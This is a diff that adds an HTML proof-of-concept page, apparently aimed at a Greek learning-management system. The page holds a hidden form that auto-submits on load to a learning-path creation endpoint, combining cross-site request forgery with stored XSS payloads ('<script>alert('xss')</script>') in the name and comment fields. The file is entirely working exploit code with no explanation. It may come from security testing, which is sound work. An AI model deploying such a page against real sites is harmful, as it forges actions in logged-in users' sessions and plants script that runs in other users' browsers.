@@ -1,0 +1,30 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/learnPath/learningPathList.php' method='post'>
+
+ <table width='99%' align='left' class='FormData'>
+    <tbody>
+    <tr>
+      <th width='220'>&nbsp;</th>
+      <td><b>Στοιχεία γραμμής μάθησης</b></td>
+    </tr>
+    <tr>
+      <th class='left'><label for='newPathName'>Όνομα νέας γραμμής μάθησης</label> :</th>
+      <td><input type='text' name='newPathName' value="<script>alert('xss')</script>" id='newPathName' size='33' maxlength='255' class='FormData_InputText'></input></td>
+    </tr>
+    <tr>
+      <th class='left'><label for='newComment'>Σχόλιο</label> :</th>
+      <td><textarea id='newComment' name='newComment' rows='2' cols='30' value="<script>alert('xss')</script>" class='FormData_InputText'></textarea></td>
+    </tr>
+    <tr>
+      <th class='left'>&nbsp;</th>
+      <td><input type='hidden' name='cmd' value='create'><input type='submit' value='Δημιουργία'></input></td>
+    </tr>
+    </tbody>
+    </table>
+
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
